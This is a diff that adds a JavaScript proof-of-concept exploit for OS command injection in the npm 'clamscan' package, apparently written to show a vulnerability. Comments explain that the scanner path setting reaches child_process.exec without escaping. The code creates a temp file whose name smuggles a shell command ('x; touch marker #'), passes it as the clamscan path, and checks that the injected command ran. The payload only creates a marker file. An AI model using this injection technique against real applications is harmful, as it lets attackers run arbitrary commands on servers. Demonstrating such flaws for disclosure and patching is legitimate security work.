@@ -1,0 +1,38 @@
+```javascript
+// Exploit for OS Command Injection in the `clamscan` package.
+//
+// In node_modules/clamscan/index.js, `_is_clamav_binary(scanner)` reads
+// `const path = this.settings[scanner].path` (a user-supplied config value)
+// and builds a command string `${path} --version` that is passed straight
+// into child_process.exec() (via cp_exec), without any shell escaping.
+// It only calls fs.access(path) first, which treats the string as a literal
+// filename (slashes aside, shell metacharacters like `;` are just normal
+// filename characters to fs.access) - so as long as a file with that exact
+// name exists, the check passes and the malicious string is then executed
+// by /bin/sh.
+//
+// This is reachable through the public `init()` API, e.g. when an
+// application forwards user-controlled configuration into NodeClam's
+// `clamscan.path` / `clamdscan.path` option.
+
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const NodeClam = require('./node_modules/clamscan');
+
+const marker = `pwned_${Date.now()}.txt`;
+// Filename itself carries the shell injection payload; fs.access() only
+// checks that this literal file exists, but child_process.exec() later
+// runs it through `/bin/sh -c`, where `;` breaks into a new command.
+const evilPath = path.join(os.tmpdir(), `x; touch ${marker} #`);
+fs.writeFileSync(evilPath, '');
+
+const clamscan = new NodeClam();
+clamscan.init({ preference: 'clamscan', clamscan: { path: evilPath, active: true } })
+  .catch(() => {})
+  .finally(() => {
+    console.log('Command injection triggered:', fs.existsSync(marker));
+    fs.unlinkSync(evilPath);
+    if (fs.existsSync(marker)) fs.unlinkSync(marker);
+  });
+```
